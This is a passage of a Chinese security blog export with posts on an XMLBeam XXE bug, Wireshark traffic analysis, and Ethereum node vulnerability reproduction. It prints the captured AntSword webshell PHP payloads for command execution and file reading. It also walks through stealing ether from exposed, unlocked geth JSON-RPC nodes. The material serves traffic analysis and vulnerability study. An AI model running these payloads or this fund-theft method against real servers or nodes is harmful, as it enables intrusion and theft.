<p>参考网上的分析，漏洞的处理函数位是在org.xmlbeam.ProjectionInvocationHandler:invokeReadProjection()处理<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614773758537.jpg" alt="-w913"></p>
<p>顺带在这里看下相对路径处理成功的原因</p>
<h2 id="待补充细分"><a href="#待补充细分" class="headerlink" title="待补充细分"></a>待补充细分</h2><p>  在提交http/post请求后，跟踪下</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> Object readWithMessageConverters
</code></pre>
<p>在对该post参数进行处理时，这里还没进行文件读取转换<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618975324384.jpg" alt="-w900"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618981734937.jpg" alt="-w1184"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618983029402.jpg" alt="-w1144"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618991907073.jpg" alt="-w1425"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15618992335070.jpg" alt="-w704"></p>
<p>漏洞原因是在于XMLBeam漏洞版本中没有限制外部实体<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619003084333.jpg" alt="-w701"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619002278361.jpg" alt="-w771"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001968741.jpg" alt="-w810"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001679940.jpg" alt="-w805"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15619001256468.jpg" alt="-w915"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">JAVA常见的XXE漏洞写法和防御</a><br><a href="https://blog.spoock.com/2018/05/16/cve-2018-1259/" target="_blank" rel="noopener">spring-data-XMLBean XXE复现分析</a><br><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">XXE with Spring Data’s XMLBeam 分析</a><br><a href="https://www.cnblogs.com/Qian123/p/5256084.html" target="_blank" rel="noopener">框架基础——全面解析Java注解</a></p>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 漏洞学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title></title>
      <url>/2019/06/10/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/wireshark%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<p>wireshark 使用记录 （-）<br>[TOC]</p>
<h1 id="恶意流量检查"><a href="#恶意流量检查" class="headerlink" title="恶意流量检查"></a>恶意流量检查</h1><p>在一台服务器上发现有恶意木马，对该设备进行wireshark 抓包分析，很久没用过wireshark了，记录回顾下。</p>
<h2 id="wireshark-流量分析"><a href="#wireshark-流量分析" class="headerlink" title="wireshark 流量分析"></a>wireshark 流量分析</h2><h3 id="过滤协议"><a href="#过滤协议" class="headerlink" title="过滤协议"></a>过滤协议</h3><p> ctrl+F 或者 http contains”xxx” 来过滤协议</p>
<h3 id="过滤IP"><a href="#过滤IP" class="headerlink" title="过滤IP"></a>过滤IP</h3><pre><code>IP源地址：ip.src ==192.168.1.1
IP目的地址：ip.dst== 192.168.1.1
IP地址（包括源和目的）：ip.addr== 192.168.1.1
</code></pre><h3 id="过滤端口"><a href="#过滤端口" class="headerlink" title="过滤端口"></a>过滤端口</h3><pre><code>TCP端口：tcp.port==80
TCP目的端口：tcp.dstport == 80
TCP源端口：tcp.srcport == 80
UDP端口：udp.port eq 15000
TCP 1-80之间的端口：tcp.port &gt;= 1 and tcp.port &lt;= 80
</code></pre><h3 id="过滤协议-1"><a href="#过滤协议-1" class="headerlink" title="过滤协议"></a>过滤协议</h3><pre><code>http、tcp、udp、arp、icmp、http、smtp、ftp、dns 等
</code></pre><h3 id="过滤包长度"><a href="#过滤包长度" class="headerlink" title="过滤包长度"></a>过滤包长度</h3><pre><code>整个UDP数据包：udp.length==20
TCP数据包中的IP数据包：tcp.len&gt;=20
整个IP数据包：ip.len==20
整个数据包：frame.len==20
</code></pre><h3 id="HTTP模式过滤"><a href="#HTTP模式过滤" class="headerlink" title="HTTP模式过滤"></a>HTTP模式过滤</h3><pre><code>请求方法为GET：http.request.method==“GET”
请求方法为POST：http.request.method==“POST”
指定URI：http.request.uri==“/img/logo-edu.gif”
请求或相应中包含特定内容：http contains “FLAG”
</code></pre><h2 id="实际分析"><a href="#实际分析" class="headerlink" title="实际分析"></a>实际分析</h2><h3 id="病毒端口分析"><a href="#病毒端口分析" class="headerlink" title="病毒端口分析"></a>病毒端口分析</h3><p>因为在服务器上发现的病毒是在tina文件夹下，tina程序执行 tina_daemon.exe,监听端口是2525，在发现是无链接，所以在拿到数据包的时候首先过滤2525 端口<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604724400866.jpg" alt="-w973"><br>经检测 无数据<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604725384626.jpg" alt="-w413"></p>
<h3 id="ip分析"><a href="#ip分析" class="headerlink" title="ip分析"></a>ip分析</h3><p>提取下数据包中包含的ip地址进行分析下<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604776123512.jpg" alt="-w1417"></p>
<p><img src="/2019/06/10/工具使用/wireshark使用记录/15604847479194.jpg" alt="-w698"></p>
<p>外网ip</p>
<pre><code>42.81.104.4 天津电信 无信息 美图
49.7.50.36 北京市北京市 电信 无信息 360
52.188.72.233 美国 微软
59.49.81.218 山西省太原市 电信 动态ip windows 更新
101.227.27.36 上海市上海市 电信 360
221.230.147.106 江苏泰州 电信 微软
</code></pre><p>内网ip：</p>
<h4 id="探测下进行ping-探测的设备"><a href="#探测下进行ping-探测的设备" class="headerlink" title="探测下进行ping 探测的设备"></a>探测下进行ping 探测的设备</h4><ul>
<li><p>ping 探测失败的信息<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604747032178.jpg" alt="-w923"><br>89.0.0.241 是DNS服务器</p>
</li>
<li><p>DNS协议<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604751748952.jpg" alt="-w1176"><br>解析到360天擎 服务端</p>
</li>
</ul>
<p>除此之外还解析请求了两个 内网，但未解析成功<br>分别是<br>10.185.49.42<br>172.17.136.21</p>
<ul>
<li>分析所有连接到ip<br>结合威胁情报 检测所有的ip，未发现敏感连接</li>
</ul>
<h3 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h3><p>回过头来看下木马程序</p>
<p><img src="/2019/06/10/工具使用/wireshark使用记录/15604729787421.jpg" alt="-w693"></p>
<p><img src="/2019/06/10/工具使用/wireshark使用记录/15604730171667.jpg" alt="-w1138"></p>
<p>根据这个信息google了一下<br><a href="https://talhatariq.wordpress.com/2006/04/14/the-open-source-psexec/" target="_blank" rel="noopener">RemCom</a></p>
<h4 id="木马工具行为分析"><a href="#木马工具行为分析" class="headerlink" title="木马工具行为分析"></a>木马工具行为分析</h4><p>该木马主要是一个开源的psexec 远程管理工具<br>工具的说明如下：</p>
<pre><code>RemCom是开源的:。
您可以根据需要在计算机上运行任意数量的远程命令
您可以直接执行内部命令（net，netsh，ipconfig）：RemCom \\ foo-bar-system net start snmp
您可以在没有任何telnet服务器的情况下与远程计算机建立轻型“telnet”连接：RemCom.exe \\ foo-bar-system cmd
您还可以复制远程计算机上的任何文件并接收其输出。
RemCom在远程计算机上创建一个小的（&lt;1 KB）服务（它在运行时从自身中提取它）。
所有通信都通过命名管道和RPC完成。
应用程序在成功断开连接时删除了连接和服务的痕迹（整洁吧？
</code></pre><p>它允许在远程Windows系统上执行进程，复制文件，处理输出并将其流回。允许直接使用完整的交互式控制台执行远程shell命令</p>
<p>分析完发现这个是一个正常的数据包，笔记写得没什么意思，又不想去逆向分析,就找找其他wireshark分析的案列看看</p>
<h2 id="数据分析案例"><a href="#数据分析案例" class="headerlink" title="数据分析案例"></a>数据分析案例</h2><p>直接搜索字符串，然后跟踪数据流如下<br><img src="/2019/06/10/工具使用/wireshark使用记录/15604975574265.jpg" alt="-w584"></p>
<p>想走捷径，在这个基础上尝试利用ftp的被动模式 PSAV 直接连接，结果却发现密码不正确，认证失败，这就很尴尬了，只有继续老老实实的分析数据包。<br>查看数据包，在数据包中直接导出文件：<br>我这里直接使用的foremost导出</p>
<pre><code>foremost -v -i name.pcap
</code></pre><p><img src="/2019/06/10/工具使用/wireshark使用记录/15606752899123.jpg" alt="-w617">导出了一个压缩包和key.log；<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606753433909.jpg" alt="-w733"></p>
<p>看一下key.log<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606824487576.jpg" alt="-w644"><br>记录的是Session Key TLS密钥（借用firfox或chrome配置记录，即可记录该信息）</p>
<p><img src="/2019/06/10/工具使用/wireshark使用记录/15606845604745.jpg" alt="-w914"><br>导出来 看下频谱图 跳下采样率，解压</p>
<h2 id="wireshark-tcp三次握手"><a href="#wireshark-tcp三次握手" class="headerlink" title="wireshark tcp三次握手"></a>wireshark tcp三次握手</h2><p>众所周知，tcp三次握手传输过程</p>
<pre><code>第一次   client --------&gt; server     syn
</code></pre><p>客户端发送syn包（syn=j）到服务器，并进入到syn_sent状态，等待服务端确认<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606653847491.jpg" alt="-w1406"><br><img src="/2019/06/10/工具使用/wireshark使用记录/15606654495869.jpg" alt="-w1334"></p>
<pre><code>第二次   server --------&gt; client     syn + ack
</code></pre><p>务器收到syn包，必须确认客户的SYN(ack=j+1)，同时自己也发送一个SYN包(syn=k)，即SYN+ACK包，此时服务器进入SYN_RECV状态;<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606654835190.jpg" alt="-w1356"></p>
<pre><code>第三次   client --------&gt; server     ack
</code></pre><p>第三次握手:客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED(TCP连接成功)状态，完成三次握手<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606655134327.jpg" alt="-w1290"></p>
<h2 id="wireshark-分析攻击现象"><a href="#wireshark-分析攻击现象" class="headerlink" title="wireshark 分析攻击现象"></a>wireshark 分析攻击现象</h2><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>在进行DDOS攻击时，wireshark从数据包中能明显看到该现象</p>
<h4 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN Flood"></a>SYN Flood</h4><ul>
<li>flag 常见标识：<br>在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.其中，对于我们日常的分析有用的就是前面的五个字段。<br>它们的含义是：<br>SYN表示建立连接，<br>FIN表示关闭连接，<br>ACK表示响应，<br>PSH表示有 DATA数据传输，<br>RST表示连接重置。<br>其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，<br>如果只是单个的一个SYN，它表示的只是建立连接。<br>TCP的几次握手就是通过这样的ACK表现出来的。<br>但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。<br>RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。<br>一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。<br>PSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。<br>TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。、</li>
</ul>
<p>这里面案例比较有意思的一点：<br>使用TTL分析发现攻击者的蛛丝马迹，当使用随机源进行DDoS攻击时，虽然使用了伪造源地址进行攻击，但攻击者无法伪造攻击主机与目标主机之间的位置关系。有时候通过观察数据包的TTL值变化，也能够获得攻击者的蛛丝马迹，为攻击防御提供辅助支持。下图所示的这个攻击程序并没有修改攻击数据包的TTL值，所有的攻击数据包使用相同的TTL值。这个攻击数据包是由局域网内的一个windows计算机发出的。<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606859908642.jpg" alt="-w590"></p>
<h4 id="UDP-FLOOD"><a href="#UDP-FLOOD" class="headerlink" title="UDP FLOOD"></a>UDP FLOOD</h4><h4 id="ICMP-FLOOD"><a href="#ICMP-FLOOD" class="headerlink" title="ICMP FLOOD"></a>ICMP FLOOD</h4><h3 id="wireshark-记录antsword"><a href="#wireshark-记录antsword" class="headerlink" title="wireshark 记录antsword"></a>wireshark 记录antsword</h3><p>起因是看了下<a href="https://bbs.ichunqiu.com/article-1608-1.html" target="_blank" rel="noopener">记一次wireshark分析中国菜刀http请求</a>想着我一般用蚁剑，于是看看AntSword的利用特征，搭建环境抓包这部分按下不表，直入正题</p>
<p>不知道为啥 同样的木马+antsword在osx 本地系统上无法执行，一直在报错，还没细看</p>
<h4 id="虚拟终端时"><a href="#虚拟终端时" class="headerlink" title="虚拟终端时"></a>虚拟终端时</h4><p><img src="/2019/06/10/工具使用/wireshark使用记录/15631138557440.jpg" alt="-w952"><br><img src="/2019/06/10/工具使用/wireshark使用记录/15631139876578.jpg" alt="-w1355"><br>可以明显看到 UA有 antsword的标志<br>其中连接shell 执行语句如下：</p>
<pre><code>0x1291b5bcd176f=L2Jpbi9zaA==&amp;0x39e42e841a89c=Y2QgIi92YXIvd3d
3L2h0bWwiO3B3ZDtlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=&amp;ant=
@ini_set(&quot;display_errors&quot;, &quot;0&quot;);
@set_time_limit(0);
function asenc($out){return $out;};
function asoutput(){
    $output=ob_get_contents();
    ob_end_clean();
    echo &quot;26623&quot;;
    echo @asenc($output);
    echo &quot;e6e71&quot;;
    }
ob_start();
try
    {
        $p=base64_decode($_POST[&quot;0x1291b5bcd176f&quot;]);
        $s=base64_decode($_POST[&quot;0x39e42e841a89c&quot;]);       
        $d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);
        $c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;    
        $r=&quot;{$p}{$c}&quot;;
        function fe($f)
        {
        $d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));
        if(empty($d)){$d=array();}
        else{
            $d=array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));
            }
        return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));
        };
        function runcmd($c)
        {
        $ret=0;
        if(fe(&#39;system&#39;)){@system($c,$ret);} 
        elseif(fe(&#39;passthru&#39;))
        {
            @passthru($c,$ret);
        }
        elseif(fe(&#39;shell_exec&#39;)){print(@shell_exec($c));}
        elseif(fe(&#39;exec&#39;)){@exec($c,$o,$ret);print(join(&quot;&quot;,$o));}
        elseif(fe(&#39;popen&#39;))
        {
        $fp=@popen($c,&#39;r&#39;);
        while(!@feof($fp){print(@fgets($fp, 2048));}
        @pclose($fp);
        }
        elseif(fe(&#39;antsystem&#39;)){@antsystem($c);}
        else{$ret = 127;}
        return $ret;
    };
    $ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);
    print ($ret!=0)?&quot;ret={$ret}&quot;:&quot;&quot;;;
}catch(Exception $e)
{echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();
</code></pre><p>获取当前脚本运行目录-获取绝对路径</p>
<pre><code>dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]
</code></pre><p>捕获分组获得字符串中的参数</p>
<pre><code>substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;    
</code></pre><p>执行命令</p>
<pre><code>runcmd($r.&quot; 2&gt;&amp;1&quot;)
</code></pre><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><pre><code>0x97c1110a314d1=L3Zhci93d3cvaHRtbC9pbmZvLnBocA==&amp;ant=
@ini_set(&quot;display_errors&quot;, &quot;0&quot;);
@set_time_limit(0);
function asenc($out)
{
    return $out;
};
function asoutput()
{    
    $output=ob_get_contents();
    ob_end_clean();
    echo &quot;d6192&quot;;
    echo @asenc($output);
    echo &quot;96e2b&quot;;
}
ob_start();
try
{
    $F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST[&quot;0x97c1110a314d1&quot;]):
    $_POST[&quot;0x97c1110a314d1&quot;]); 
    $fp=@fopen($F,&quot;r&quot;);
    if(@fgetc($fp))
        {
        @fclose($fp);
        @readfile($F);
        }
    else{
        echo(&quot;ERROR:// Can Not Read&quot;);
        };
}
catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();

</code></pre><p>这里比较有区别的地方，使用了fopen读取文件内容 进行下载</p>
<pre><code> $fp=@fopen($F,&quot;r&quot;);
</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[wireshark还原数据文件]<br>(<a href="http://blog.sina.com.cn/s/blog_e8e60bc00102vfd9.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_e8e60bc00102vfd9.html</a>)<br><a href="https://www.2cto.com/article/201502/377678.html" target="_blank" rel="noopener">破解ssl加密数据包</a><br><a href="https://security.tencent.com/index.php/blog/msg/3" target="_blank" rel="noopener">使用Wireshark分析并发现DDoS攻击</a><br><a href="http://www.360doc.com/content/17/0123/20/33093582_624406842.shtml" target="_blank" rel="noopener">WireShark分析针对路由器的linux木马</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ETH 漏洞复现]]></title>
      <url>/2019/03/14/%E5%8C%BA%E5%9D%97%E9%93%BE/ETH/ETH-1/%E5%81%B7%E6%B8%A1%E6%BC%8F%E6%B4%9E_%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="ETH"><a href="#ETH" class="headerlink" title="ETH"></a>ETH</h1><p>系统环境 ubuntu 16</p>
<h2 id="搭建私有测试链"><a href="#搭建私有测试链" class="headerlink" title="搭建私有测试链"></a>搭建私有测试链</h2><ul>
<li>下载相关的go-ethereum 协议</li>
</ul>
<p>git clone <a href="https://github.com/ethereum/go-ethereum.git" target="_blank" rel="noopener">https://github.com/ethereum/go-ethereum.git</a></p>
<ul>
<li>安装go环境</li>
</ul>
<p>wget <a href="https://dl.google.com/go/go1.12.linux-amd64.tar.gz" target="_blank" rel="noopener">https://dl.google.com/go/go1.12.linux-amd64.tar.gz</a></p>
<p>tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz</p>
<p>修改配置环境<br>vim ~/.bashrc</p>
<pre><code>export GOROOT=/usr/local/go
export GOPATH=/home/go_demo
export PATH=$PATH:$GOPATH:/usr/local/go/bin
</code></pre><ul>
<li>make geth</li>
<li>连接测试网络</li>
</ul>
<p>因为仅仅是作为测试链来使用，这里就不连接到主网了，毕竟同步数据会消耗长时间和硬盘。</p>
<p>./build/bin/geth –testnet console</p>
<ul>
<li><p>开启json-rpc  端口</p>
<p>geth –rpc –rpcaddr <ip> –rpcport <portnumber></portnumber></ip></p>
</li>
<li>RPC常用调用格式</li>
</ul>
<pre><code>cur addr:port -X POST --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:id, &quot;method&quot;:&quot;${method}&quot;,&quot;params&quot;:&quot;${params}&quot;}&#39;
</code></pre><h2 id="创建私有链-待续"><a href="#创建私有链-待续" class="headerlink" title="创建私有链-待续"></a>创建私有链-待续</h2><h3 id="部署测试合约-待续"><a href="#部署测试合约-待续" class="headerlink" title="部署测试合约-待续"></a>部署测试合约-待续</h3><h3 id="合约创建子链-待续"><a href="#合约创建子链-待续" class="headerlink" title="合约创建子链-待续"></a>合约创建子链-待续</h3><hr>
<h3 id="ETH-节点JSON-RPC测试"><a href="#ETH-节点JSON-RPC测试" class="headerlink" title="ETH 节点JSON-RPC测试"></a>ETH 节点JSON-RPC测试</h3><p>RPC接口：</p>
<pre><code>    web3_clientVersion


    web3_sha3
    net_version
    net_peerCount
    net_listening
    eth_protocolVersion
    eth_syncing
    eth_coinbase
    eth_mining
    eth_hashrate
    eth_gasPrice
    eth_accounts
    eth_blockNumber
    eth_getBalance
    eth_getStorageAt
    eth_getTransactionCount
    eth_getBlockTransactionCountByHash
    eth_getBlockTransactionCountByNumber
    eth_getUncleCountByBlockHash
    eth_getUncleCountByBlockNumber
    eth_getCode
    eth_sign
    eth_sendTransaction
    eth_sendRawTransaction
    eth_call
    eth_estimateGas
    eth_getBlockByHash
    eth_getBlockByNumber
    eth_getTransactionByHash
    eth_getTransactionByBlockHashAndIndex
    eth_getTransactionByBlockNumberAndIndex
    eth_getTransactionReceipt
    eth_getUncleByBlockHashAndIndex
    eth_getUncleByBlockNumberAndIndex
    eth_getCompilers
    eth_compileLLL
    eth_compileSolidity
    eth_compileSerpent
    eth_newFilter
    eth_newBlockFilter
    eth_newPendingTransactionFilter
    eth_uninstallFilter
    eth_getFilterChanges
    eth_getFilterLogs
    eth_getLogs
    eth_getWork
    eth_submitWork
    eth_submitHashrate
    db_putString
    db_getString
    db_putHex
    db_getHex
    shh_post
    shh_version
    shh_newIdentity
    shh_hasIdentity
    shh_newGroup
    shh_addToGroup
    shh_newFilter
    shh_uninstallFilter
    shh_getFilterChanges
    shh_getMessages
</code></pre><h2 id="创建钱包"><a href="#创建钱包" class="headerlink" title="创建钱包"></a>创建钱包</h2><p>启动节点后，调用节点自身的console，创建账号</p>
<pre><code>&gt; eth.accounts
</code></pre><p>查询钱包用户</p>
<pre><code>&gt; personal.newAccount()
</code></pre><p>创建钱包用户<br>这里注意下，当一个节点绑定多个钱包账户的时候，挖矿的收益会默认在第一个创始账户中，这个时候要改变收益账号</p>
<pre><code>&gt; miner.setEtherbase(eth.accounts[1])
成功改变会返回 true
</code></pre><p>查询获益钱包账户</p>
<pre><code>&gt; eth.coinbase
</code></pre><pre><code>&gt;personal.unlockAccount(address,passwd,time)
</code></pre><p>解锁钱包用户</p>
<p>查询余额</p>
<pre><code>curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;eth_getBalance&quot;,&quot;params&quot;:[&quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,&quot;latest&quot;],&quot;id&quot;:67}&#39; 172.25.0.10:8545
</code></pre><p>发起转账请求</p>
<pre><code>curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [{                                                                               
  &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,
  &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;,
  &quot;value&quot;: &quot;0x1&quot;
}],
&quot;id&quot;:67}&#39; 172.25.0.10:8545
</code></pre><p>但是注意一下在此处的 当余额为0的时候，会报错，报错信息如下：</p>
<pre><code>&quot;error&quot;:{&quot;code&quot;:-32000,&quot;message&quot;:&quot;exceeds block gas limit&quot;}
</code></pre><p>待深究</p>
<p>其中 personal_listWallets 接口可以查看所有账户的解锁情况。</p>
<h3 id="偷渡漏洞验证"><a href="#偷渡漏洞验证" class="headerlink" title="偷渡漏洞验证"></a>偷渡漏洞验证</h3><p>以太坊交易流程</p>
<pre><code>用户发起转账请求。

以太坊对转账信息进行签名

校验签名后的信息并将信息加入交易缓存池 (txpool)

从交易缓存池中提取交易信息进行广播
</code></pre><p>此处的核心便是对personal_unlockAccount的爆破攻击，在爆破成功后或者用户自身交易解锁的空余时间内，对该接口进行解锁，在解锁后，攻击者便调用转账函数，对该接口以较高的gas进行转账处理。</p>
<p>防范方法：</p>
<pre><code> personal.sendTransaction 进行转账
</code></pre><p>关于 personal.sendTransaction与personal_unlockAccount对区别<br>这也就意味着如果执行了 unlockAccount() 函数、没有超时的话，从 ipc、rpc 调用 SendTransaction() 都会成功签名相关交易</p>
<h4 id="偷渡漏洞接口爆破"><a href="#偷渡漏洞接口爆破" class="headerlink" title="偷渡漏洞接口爆破"></a>偷渡漏洞接口爆破</h4><p>爆破的目标<br>personal_unlockAccount 接口变成了 personal_sendTransaction 接口</p>
<p>开启挖矿</p>
<pre><code>curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;miner_start&quot;,&quot;params&quot;:[],&quot;id&quot;:67}&#39; 172.25.0.10:8545
</code></pre><p>或者 用本地console</p>
<pre><code>miner.start(1)
</code></pre><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这里用docker 环境下的python3.6<br>docker run -it python:3.6 /bin/bash</p>
<h5 id="探测节点端口是否开放、获取当前区块高度"><a href="#探测节点端口是否开放、获取当前区块高度" class="headerlink" title="探测节点端口是否开放、获取当前区块高度"></a>探测节点端口是否开放、获取当前区块高度</h5><p>直接调用RPC 8545端口</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token punctuation">,</span>HTTPProvider
<span class="token operator">>></span><span class="token operator">></span> web3<span class="token operator">=</span>Web3<span class="token punctuation">(</span>HTTPProvider<span class="token punctuation">(</span><span class="token string">"http://xx.xx.xx.xx:8545/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>blockNumber
</code></pre>
<h5 id="探测节点上是否绑定有相关账户"><a href="#探测节点上是否绑定有相关账户" class="headerlink" title="探测节点上是否绑定有相关账户"></a>探测节点上是否绑定有相关账户</h5><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>accounts
</code></pre>
<h5 id="查询下账户相关余额"><a href="#查询下账户相关余额" class="headerlink" title="查询下账户相关余额"></a>查询下账户相关余额</h5><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getBalance<span class="token punctuation">(</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>accounts<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<h5 id="调用RPC爆破账户"><a href="#调用RPC爆破账户" class="headerlink" title="调用RPC爆破账户"></a>调用RPC爆破账户</h5><h5 id="轮询监控节点解锁账户"><a href="#轮询监控节点解锁账户" class="headerlink" title="轮询监控节点解锁账户"></a>轮询监控节点解锁账户</h5><h5 id="解锁期间进行转账"><a href="#解锁期间进行转账" class="headerlink" title="解锁期间进行转账"></a>解锁期间进行转账</h5><p>没什么可写的，就是用个循环，调用web3.eth.sendTransaction 不停的进行转账请求</p>
<h4 id="离线状态下偷渡漏洞"><a href="#离线状态下偷渡漏洞" class="headerlink" title="离线状态下偷渡漏洞"></a>离线状态下偷渡漏洞</h4><p>跟偷渡漏洞实质没有区别，只是区别在于，不是在解锁期间进行转账，是在解锁期间调用转账签名eth_signTransaction，在账户解锁期间按照 nonce 递增的顺序构造多笔转账的签名，然后再在攻击者自己的节点上根据签名返回的raw 对签名进行广播，eth.sendRawTransaction(raw),达到转账的目的</p>
<hr>
<h3 id="轻节点的拒绝服务漏洞-待分析"><a href="#轻节点的拒绝服务漏洞-待分析" class="headerlink" title="轻节点的拒绝服务漏洞-待分析"></a>轻节点的拒绝服务漏洞-待分析</h3><ul>
<li>知识简介：<br>同步区块数据中，P2P模式，也分为客户端和服务端，在这其中，获取数据的是客户端，推送数据的属于服务端。</li>
</ul>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>漏洞主要利用的是轻节点协议LES协议，复现前先缕一下这个函数及其功能。</p>
<h6 id="LES协议"><a href="#LES协议" class="headerlink" title="LES协议"></a>LES协议</h6><p>全称：Light Ethereum Subprotocol<br>以太坊三层协议中的上层协议</p>
<ul>
<li>层1 以太坊应用层协议: eth协议、les协议</li>
<li>层2 p2p 通信链路</li>
<li>层3 go语言的网络IO层</li>
</ul>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>les/handler.go </p>
<pre><code>            case query.Origin.Hash != (common.Hash{}) &amp;&amp; !query.Reverse:
                // Hash based traversal towards the leaf block
                if header := pm.blockchain.GetHeaderByNumber(origin.Number.Uint64() + query.Skip + 1); header != nil {
                    if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash {
                        query.Origin.Hash = header.Hash()
                    } else {
                        unknown = true
                    }
                } else {
                    unknown = true
                }
            case query.Reverse:
                // Number based traversal towards the genesis block
                if query.Origin.Number &gt;= query.Skip+1 {
                    query.Origin.Number -= (query.Skip + 1)
                } else {
                    unknown = true
                }

            case !query.Reverse:
                // Number based traversal towards the leaf block
                query.Origin.Number += (query.Skip + 1)
            }
        }

